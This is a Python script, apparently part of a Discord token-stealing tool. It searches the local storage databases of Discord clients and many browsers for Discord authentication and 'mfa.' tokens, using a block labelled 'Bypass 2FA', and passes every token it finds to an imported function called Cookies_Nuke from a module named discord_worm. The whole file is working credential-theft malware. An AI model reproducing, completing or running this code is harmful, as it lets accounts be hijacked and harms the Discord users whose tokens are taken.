import os, re
from util.discord_worm import Cookies_Nuke


def find_tokens(path):
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        
        # <========== Bypass 2FA START ==========>
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
        # <========== Bypass 2FA END ==========>
    return tokens

def grab():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
            'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': local + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': local + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': local + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': local + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': local + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': local + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': local + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': local + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': local + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': local + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': local + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': local + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                Cookies_Nuke(token)
        else:
            shit = 12



